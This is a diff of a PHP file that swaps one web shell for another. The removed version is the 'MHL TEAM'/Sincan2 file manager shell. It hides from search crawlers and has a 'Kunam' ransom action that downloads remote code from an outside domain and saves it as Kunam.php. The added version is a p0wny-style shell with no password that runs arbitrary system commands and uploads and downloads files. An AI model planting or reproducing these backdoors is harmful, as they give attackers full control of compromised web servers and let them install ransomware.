@@ -1,613 +1,601 @@
 <?php
-session_start();
-error_reporting(0);
-set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log',NULL);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
 
-$auth_pass = "027e07f1ee6102251ca45f1259f918e1"; //  
-$color = "#00ff00";
-$default_action = 'FilesMan';
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
-    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
+$SHELL_CONFIG = array(
+    'username' => 'Sincan2',
+    'hostname' => 'Sincan2',
+);
+
+function expandPath($path) {
+    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
+        exec("echo $match[1]", $stdout);
+        return $stdout[0] . $match[2];
+    }
+    return $path;
+}
+
+function allFunctionExist($list = array()) {
+    foreach ($list as $entry) {
+        if (!function_exists($entry)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+function executeCommand($cmd) {
+    $output = '';
+    if (function_exists('exec')) {
+        exec($cmd, $output);
+        $output = implode("\n", $output);
+    } else if (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
+        $handle = popen($cmd, 'r');
+        while (!feof($handle)) {
+            $output .= fread($handle, 4096);
+        }
+        pclose($handle);
+    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
+        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+        $output = stream_get_contents($pipes[1]);
+        proc_close($handle);
+    }
+    return $output;
+}
+
+function isRunningWindows() {
+    return stripos(PHP_OS, "WIN") === 0;
+}
+
+function featureShell($cmd, $cwd) {
+    $stdout = "";
+
+    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
+        chdir(expandPath("~"));
+    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        chdir(expandPath($match[1]));
+    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+        chdir($cwd);
+        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+        return featureDownload($match[1]);
+    } else {
+        chdir($cwd);
+        $stdout = executeCommand($cmd);
+    }
+
+    return array(
+        "stdout" => base64_encode($stdout),
+        "cwd" => base64_encode(getcwd())
+    );
+}
+
+function featurePwd() {
+    return array("cwd" => base64_encode(getcwd()));
+}
+
+function featureHint($fileName, $cwd, $type) {
+    chdir($cwd);
+    if ($type == 'cmd') {
+        $cmd = "compgen -c $fileName";
+    } else {
+        $cmd = "compgen -f $fileName";
+    }
+    $cmd = "/bin/bash -c \"$cmd\"";
+    $files = explode("\n", shell_exec($cmd));
+    foreach ($files as &$filename) {
+        $filename = base64_encode($filename);
+    }
+    return array(
+        'files' => $files,
+    );
+}
+
+function featureDownload($filePath) {
+    $file = @file_get_contents($filePath);
+    if ($file === FALSE) {
+        return array(
+            'stdout' => base64_encode('File not found / no read permission.'),
+            'cwd' => base64_encode(getcwd())
+        );
+    } else {
+        return array(
+            'name' => base64_encode(basename($filePath)),
+            'file' => base64_encode($file)
+        );
     }
 }
 
-function login_shell() {
-?>
-<!DOCTYPE html>
-<html>
-	<title>MHL TEAM</title>
-	<head>
-		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
-		<meta name="author" content="MHL"/>
-		<meta name="copyright" content="MHL TEAM"/>
-		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
-		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
-	</head>
-	<body class="bg-dark text-light">
-		<center>
-			<br/><h3>Sincan2</h3><hr/><br/>
-			<div class="container">
-				<div class="col-lg-6">
-					<div class="form-group">
-					<h5> Silahkan Masuk</h5>
-					<br/>
-						<form method="post">
-							<input type="password" name="pass" placeholder="Password" class="form-control"><br/>
-							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
-						</form>
-					</div>
-				</div><br/>
-			</div>
-		</center>
-	</body>
-</html>
-<?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    else
-        login_shell();
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-    @ob_clean();
-    $file = $_GET['file'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
-}
-?>
-
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-		<meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
-
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
-  <!-- Custom styles for this template -->
-  <style>
-body {
-  overflow-x: hidden;
-}
-.ico {width:20px;}
-.ico2{width:20px;}
-#sidebar-wrapper {
-  min-height: 100vh;
-  margin-left: -15rem;
-  -webkit-transition: margin .25s ease-out;
-  -moz-transition: margin .25s ease-out;
-  -o-transition: margin .25s ease-out;
-  transition: margin .25s ease-out;
+function featureUpload($path, $file, $cwd) {
+    chdir($cwd);
+    $f = @fopen($path, 'wb');
+    if ($f === FALSE) {
+        return array(
+            'stdout' => base64_encode('Invalid path / no write permission.'),
+            'cwd' => base64_encode(getcwd())
+        );
+    } else {
+        fwrite($f, base64_decode($file));
+        fclose($f);
+        return array(
+            'stdout' => base64_encode('Done.'),
+            'cwd' => base64_encode(getcwd())
+        );
+    }
 }
 
-#sidebar-wrapper .sidebar-heading {
-  padding: 0.875rem 1.25rem;
-  font-size: 1.2rem;
+function initShellConfig() {
+    global $SHELL_CONFIG;
+
+    if (isRunningWindows()) {
+        $username = getenv('USERNAME');
+        if ($username !== false) {
+            $SHELL_CONFIG['username'] = $username;
+        }
+    } else {
+        $pwuid = posix_getpwuid(posix_geteuid());
+        if ($pwuid !== false) {
+            $SHELL_CONFIG['username'] = $pwuid['name'];
+        }
+    }
+
+    $hostname = gethostname();
+    if ($hostname !== false) {
+        $SHELL_CONFIG['hostname'] = $hostname;
+    }
 }
 
-#sidebar-wrapper .list-group {
-  width: 15rem;
-}
+if (isset($_GET["feature"])) {
 
-#page-content-wrapper {
-  min-width: 100vw;
-}
+    $response = NULL;
 
-#wrapper.toggled #sidebar-wrapper {
-  margin-left: 0;
-}
+    switch ($_GET["feature"]) {
+        case "shell":
+            $cmd = $_POST['cmd'];
+            if (!preg_match('/2>/', $cmd)) {
+                $cmd .= ' 2>&1';
+            }
+            $response = featureShell($cmd, $_POST["cwd"]);
+            break;
+        case "pwd":
+            $response = featurePwd();
+            break;
+        case "hint":
+            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+            break;
+        case 'upload':
+            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+    }
 
-@media (min-width: 768px) {
-  #sidebar-wrapper {
-    margin-left: 0;
-  }
-
-  #page-content-wrapper {
-    min-width: 0;
-    width: 100%;
-  }
-
-  #wrapper.toggled #sidebar-wrapper {
-    margin-left: -15rem;
-  }
-}
-  </style>
-</head>
-<body>
-
- 
-    <!-- /#sidebar-wrapper -->
-
-    <!-- Page Content -->
-    <div id="page-content-wrapper">
-
-      <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
-        <button class="btn btn-primary" id="menu-toggle"><i class="fa fa-user"></i></button>
-
-        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-          <span class="navbar-toggler-icon"></span>
-        </button>
-
-        <div class="collapse navbar-collapse" id="navbarSupportedContent">
-          <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
-            <li class="nav-item active">
-              <a class="nav-link" href="?">Home <span class="sr-only">(current)</span></a>
-            </li>
-            <li class="nav-item">
-             
-<?php
-if(isset($_GET['path'])){
-$path = $_GET['path'];
-}else{
-$path = getcwd();
-}
-$path = str_replace('\\','/',$path);
-$paths = explode('/',$path);
-
-foreach( $paths as $id => $pat ){
-if( $pat == '' && $id == 0 ){
-$a = true;
-echo 'Current Dir => <a href="?path=/">/</a>';
-continue;
-}
-if( $pat == '' ) continue;
-echo '<a href="?path=';
-for( $i = 0; $i <= $id; $i++){
-echo "$paths[$i]";
-if( $i != $id ) echo "/";
-}
-echo '">'.$pat.'</a>/';
-}
-?>
-             
-            </li>
-            <li class="nav-item dropdown">
-              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                Informasi & Upload
-              </a>
-              <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
-                <a class="dropdown-item" href="?info">Info Server</a>
-                <div class="dropdown-divider"></div>
-                <center>
-               <form method="post" enctype="multipart/form-data">
-               	<input type="file" name="file"><input type="submit" name="upload" value="Upload">
-               </form>
-               </center>
-              </div>
-            </li>
-          </ul>
-        </div>
-      </nav>
- <div class="d-flex" id="wrapper">
-    <!-- Sidebar -->
-    <div class="bg-light border-right" id="sidebar-wrapper">
-      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> MHL TEAM</a></div>
-      <div class="list-group list-group-flush">
-      	<?php
-      	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Buat Folder</a>
-      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>
-      	<a href='?path=$path&aksi=ransom' class='list-group-item list-group-item-action bg-light'><i class='fa fa-exclamation-triangle'></i> Kunam</a>";
-      	?>
-        <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> Logout</a>
-        
-      </div>
-    </div>
-      <div class="container-fluid">
-        
-        
-<?php
-if($_GET["keluar"] == true){
-unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
-	echo "<script>window.location='?';</script>";
-}
-if($_GET['aksi'] == 'buatfolder'){
-	function hai(){
-		echo "<script>window.location='?path=".$path."'; alert('Folder Sukses Dibuat!')</script>";
-	}
-	if(isset($_POST["folderss"])){
-		$nama_folder = $path.'/'.$_POST["namaF"];
-		mkdir($nama_folder,hai());
-	}
-		
-	echo '
-	<div class="row mt-3">
-		<div class="col">
-			<form method="post">
-	<input type="text" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
-		</div>
-		<div class="col">
-			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
-				</div>
-				</div>';
-}elseif($_GET["aksi"] == 'ransom'){
-	
-	
-// Ubah Link ransomnya jika ingin ganti ransomware yangvlain
-	$url  = "https://mergosono.my.id";
-  $curl = curl_init($url);
-  				curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
-  $get	= curl_exec($curl);
- if(!$get == ""){ // Jika isi file dari url tidak kosong
-// Buat file
-$puts = fopen("Kunam.php","w");
-				fwrite($puts,$get);
-				fclose($puts);
-$nama_file  = "Kunam.php";
-$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
-if($puts == true){
-	echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
-}else{
-	echo "Gagal Membuat File";
-	}
-}else{
-	echo "Not Found!!";
-}
-
-	
-}elseif($_GET["aksi"] == 'buatfile'){
-	if(isset($_POST["buat"])){
-	$namaF = $path.'/'.$_POST["nama_file"];
-	$isi = $_POST["isi"];
-	$buat = fopen($namaF,"w");
-	fwrite($buat,$isi);
-	fclose($buat);
-	if($buat == TRUE){
-		echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-}
-echo '<form method="post" class="mt-3">
-	<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
-		<textarea class="form-control mb-3" rows="8" name="isi" placeholder="Isi File"></textarea>
-		<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">';
-}else
-
-// Informasi Server
-
-if(isset($_GET["info"])){
-echo '
-	<div class="alert alert-success mt-3">
-		<h3 class="text-center">Informasi Server</h3><hr>
-		<li>Nama Server : '.$_SERVER["SERVER_NAME"].'</li>
-		<li>Ip Address : '.$_SERVER["SERVER_ADDR"].'</li>
-		<li>Port : '.$_SERVER["SERVER_PORT"].'</li>
-		<li>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</li>
-		<li>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</li>
-		<li>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</li>
-		<li>Software : '.$_SERVER["SERVER_SOFTWARE"].'</li>
-		<li>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</li>
-		<li>G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].'</li>
-		<li>R-Method : '.$_SERVER["REQUEST_METHOD"].'</li>
-		<li>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</li>
-		</div>';
-}else if(isset($_FILES['file'])){
-if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo "<script>window.location='?path=".$path."'; alert('Valid!!')</script>";
-}else{
-echo "<script>alert('Gagal Upload')</script>";
-}
-}else if(isset($_GET['filesrc'])){
-echo "<tr><td>Current File : ";
-echo $_GET['filesrc'];
-echo '</tr></td></table><br />';
-echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-}else if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-if($_POST['opt'] == 'chmod'){
-if(isset($_POST['perm'])){
-if(chmod($_POST['path'],$_POST['perm'])){
-echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-}
-echo '<form method="POST">
-	<div class="row">
-		<div class="col">
-<input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" class="form-control">
-	</div>
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="chmod">
-	<div class="col">
-<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
-	</div>
-	</div>
-</form>';
-}else if($_POST['opt'] == 'rename'){
-if(isset($_POST['newname'])){
-if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo "<script>window.location='?path=".$path."'; alert('Nama Telah Diubah!')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-$_POST['name'] = $_POST['newname'];
-}
-echo '<form method="POST">
-	<div class="row">
-		<div class="col">
-<input name="newname" type="text" size="20" value="'.$_POST['name'].'" class="form-control" placeholder="Nama Baru">
-	</div>
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="rename">
-	<div class="col">
-<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
-</div>
-</div>
-</form>';
-}else if($_POST['opt'] == 'edit'){
-if(isset($_POST['src'])){
-$fp = fopen($_POST['path'],'w');
-if(fwrite($fp,$_POST['src'])){
-echo "<script>window.location='?path=".$path."'; alert('Berhasil Merubah Nama File')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-fclose($fp);
-}
-echo '<form method="POST">
-<textarea class="form-control" rows="8" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
-<input type="hidden" name="path" value="'.$_POST['path'].'">
-<input type="hidden" name="opt" value="edit">
-<input type="submit" value="Simpan" class="btn btn-outline-primary btn-block mt-3">
-</form>';
-}
-echo '</center>';
-}else{
-echo '</table><br/><center>';
-if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
-if($_POST['type'] == 'dir'){
-if(rmdir($_POST['path'])){
-echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus Folder')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-}else if($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){
-echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus File')</script>";
-}else{
-echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
-}
-}
-}
-echo '</center>';
-$scandir = scandir($path);
-echo '
-<div class="table-responsive-lg mt-2">
-	<table class="table table-hover">
-		<thead class="bg-warning text-center">
-			<tr>
-				<th scope="col">Nama</th>
-				<th scope="col">Jenis</th>
-				<th scope="col">Ukuran</th>
-				<th scope="col">Perizinan</th>
-				<th scope="col">Aksi</th></tr></thead>
-	';
-	foreach($scandir as $dir){
-if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
-echo '<tr>
-<td scope="col"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
-<td class="text-center">Folder</td>
-<td class="text-center">--</td>
-<td class="text-center">';
-if(is_writable($path.'/'.$dir)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
-echo perms($path.'/'.$dir);
-if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
-
-echo '</td>
-<td class="text-center"><form method="POST" action="?option&path='.$path.'">
-	<div class="row">
-		<div class="col">
-<select name="opt" class="custom-select">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
-</select>
-</div>
-<input type="hidden" name="type" value="dir">
-<input type="hidden" name="name" value="'.$dir.'">
-<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
-	<div class="col">
-<input type="submit" value=">" class="btn btn-outline-primary btn-block">
-	</div>
-	</div>
-</form></td>
-</tr>';
-}
-foreach($scandir as $file){
-if(!is_file($path.'/'.$file)) continue;
-$size = filesize($path.'/'.$file)/1024;
-$size = round($size,3);
-if($size >= 1024){
-$size = round($size/1024,2).' MB';
-}else{
-$size = $size.' KB';
-}
-
-echo '<tr>
-<td><img src="';
-					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-					if($ext == "php") {
-						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
-					}elseif ($ext == "html") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
-					}elseif ($ext == "css") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
-					}elseif ($ext == "png") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
-					}elseif ($ext == "jpg") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
-					}elseif ($ext == "jpeg") {
-						echo 'http://i.imgur.com/e8mkvPf.png"';
-					}elseif($ext == "zip") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
-					}elseif ($ext == "js") {
-						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
-					}elseif ($ext == "ttf") {
-						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
-					}elseif ($ext == "otf") {
-						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
-					}elseif ($ext == "txt") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
-					}elseif ($ext == "ico") {
-						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
-					}elseif ($ext == "conf") {
-						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
-					}elseif ($ext == "htaccess") {
-						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
-					}elseif ($ext == "sh") {
-						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
-					}elseif ($ext == "py") {
-						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
-					}elseif ($ext == "sql") {
-						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
-					}elseif ($ext == "pl") {
-						echo 'http://i.imgur.com/PnmX8H9.png';
-					}elseif ($ext == "pdf") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
-					}elseif ($ext == "mp4") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
-					}elseif ($ext == "mp3") {
-						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
-					}elseif ($ext == "git") {
-						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
-					}elseif ($ext == "md") {
-						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
-					}else{
-						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
-					}
-					echo '" class="ico2"> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
-<td class="text-center">File</td>
-<td class="text-center">'.$size.'</td>
-<td class="text-center">';
-if(is_writable($path.'/'.$file)) echo '<font color="green">';
-elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
-echo perms($path.'/'.$file);
-if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
-echo '</td>
-<td class="text-center">
-	<form method="POST" action="?option&path='.$path.'">
-		<div class="row">
-			<div class="col">
-<select name="opt" class="custom-select">
-<option value="">Select</option>
-<option value="delete">Delete</option>
-<option value="chmod">Chmod</option>
-<option value="rename">Rename</option>
-<option value="edit">Edit</option>
-</select>
-</div>
-<input type="hidden" name="type" value="file">
-<input type="hidden" name="name" value="'.$file.'">
-<input type="hidden" name="path" value="'.$path.'/'.$file.'">
-	<div class="col">
-<input type="submit" value="OK" class="btn btn-outline-primary btn-block">
-	</div>
-	</div>
-</form></td>
-</tr>';
-}
-echo '</table>
-</div>';
-}
-?>
-        
-        
-      </div>
-    </div>
-    <!-- /#page-content-wrapper -->
-  </div>
-  <!-- /#wrapper -->
-
-  <!-- Bootstrap core JavaScript -->
-  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
-
-  <!-- Menu Toggle Script -->
-  <script>
-    $("#menu-toggle").click(function(e) {
-      e.preventDefault();
-      $("#wrapper").toggleClass("toggled");
-    });
-  </script>
-
-</body>
-</html>
-<?php
-function perms($file){
-$perms = fileperms($file);
-
-if (($perms & 0xC000) == 0xC000) {
-// Socket
-$info = 's';
-} elseif (($perms & 0xA000) == 0xA000) {
-// Symbolic Link
-$info = 'l';
-} elseif (($perms & 0x8000) == 0x8000) {
-// Regular
-$info = '-';
-} elseif (($perms & 0x6000) == 0x6000) {
-// Block special
-$info = 'b';
-} elseif (($perms & 0x4000) == 0x4000) {
-// Directory
-$info = 'd';
-} elseif (($perms & 0x2000) == 0x2000) {
-// Character special
-$info = 'c';
-} elseif (($perms & 0x1000) == 0x1000) {
-// FIFO pipe
-$info = 'p';
+    header("Content-Type: application/json");
+    echo json_encode($response);
+    die();
 } else {
-// Unknown
-$info = 'u';
+    initShellConfig();
 }
 
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-(($perms & 0x0800) ? 's' : 'x' ) :
-(($perms & 0x0800) ? 'S' : '-'));
+?><!DOCTYPE html>
 
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-(($perms & 0x0400) ? 's' : 'x' ) :
-(($perms & 0x0400) ? 'S' : '-'));
+<html>
 
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-(($perms & 0x0200) ? 't' : 'x' ) :
-(($perms & 0x0200) ? 'T' : '-'));
+    <head>
+        <meta charset="UTF-8" />
+        <title>p0wny@shell:~#</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <style>
+            html, body {
+                margin: 0;
+                padding: 0;
+                background: #333;
+                color: #eee;
+                font-family: monospace;
+                width: 100vw;
+                height: 100vh;
+                overflow: hidden;
+            }
 
-return $info;
-}
-?>
+            *::-webkit-scrollbar-track {
+                border-radius: 8px;
+                background-color: #353535;
+            }
+
+            *::-webkit-scrollbar {
+                width: 8px;
+                height: 8px;
+            }
+
+            *::-webkit-scrollbar-thumb {
+                border-radius: 8px;
+                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
+                background-color: #bcbcbc;
+            }
+
+            #shell {
+                background: #222;
+                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
+                font-size: 10pt;
+                display: flex;
+                flex-direction: column;
+                align-items: stretch;
+                max-width: calc(100vw - 2 * var(--shell-margin));
+                max-height: calc(100vh - 2 * var(--shell-margin));
+                resize: both;
+                overflow: hidden;
+                width: 100%;
+                height: 100%;
+                margin: var(--shell-margin) auto;
+            }
+
+            #shell-content {
+                overflow: auto;
+                padding: 5px;
+                white-space: pre-wrap;
+                flex-grow: 1;
+            }
+
+            #shell-logo {
+                font-weight: bold;
+                color: #FF4180;
+                text-align: center;
+            }
+
+            :root {
+                --shell-margin: 25px;
+            }
+
+            @media (min-width: 1200px) {
+                :root {
+                    --shell-margin: 50px !important;
+                }
+            }
+
+            @media (max-width: 991px),
+                   (max-height: 600px) {
+                #shell-logo {
+                    font-size: 6px;
+                    margin: -25px 0;
+                }
+                :root {
+                    --shell-margin: 0 !important;
+                }
+                #shell {
+                    resize: none;
+                }
+            }
+
+            @media (max-width: 767px) {
+                #shell-input {
+                    flex-direction: column;
+                }
+            }
+
+            @media (max-width: 320px) {
+                #shell-logo {
+                    font-size: 5px;
+                }
+            }
+
+            .shell-prompt {
+                font-weight: bold;
+                color: #75DF0B;
+            }
+
+            .shell-prompt > span {
+                color: #1BC9E7;
+            }
+
+            #shell-input {
+                display: flex;
+                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
+                border-top: rgba(255, 255, 255, .05) solid 1px;
+                padding: 10px 0;
+            }
+
+            #shell-input > label {
+                flex-grow: 0;
+                display: block;
+                padding: 0 5px;
+                height: 30px;
+                line-height: 30px;
+            }
+
+            #shell-input #shell-cmd {
+                height: 30px;
+                line-height: 30px;
+                border: none;
+                background: transparent;
+                color: #eee;
+                font-family: monospace;
+                font-size: 10pt;
+                width: 100%;
+                align-self: center;
+                box-sizing: border-box;
+            }
+
+            #shell-input div {
+                flex-grow: 1;
+                align-items: stretch;
+            }
+
+            #shell-input input {
+                outline: none;
+            }
+        </style>
+
+        <script>
+            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
+            var CWD = null;
+            var commandHistory = [];
+            var historyPosition = 0;
+            var eShellCmdInput = null;
+            var eShellContent = null;
+
+            function _insertCommand(command) {
+                eShellContent.innerHTML += "\n\n";
+                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
+                eShellContent.innerHTML += escapeHtml(command);
+                eShellContent.innerHTML += "\n";
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _insertStdout(stdout) {
+                eShellContent.innerHTML += escapeHtml(stdout);
+                eShellContent.scrollTop = eShellContent.scrollHeight;
+            }
+
+            function _defer(callback) {
+                setTimeout(callback, 0);
+            }
+
+            function featureShell(command) {
+
+                _insertCommand(command);
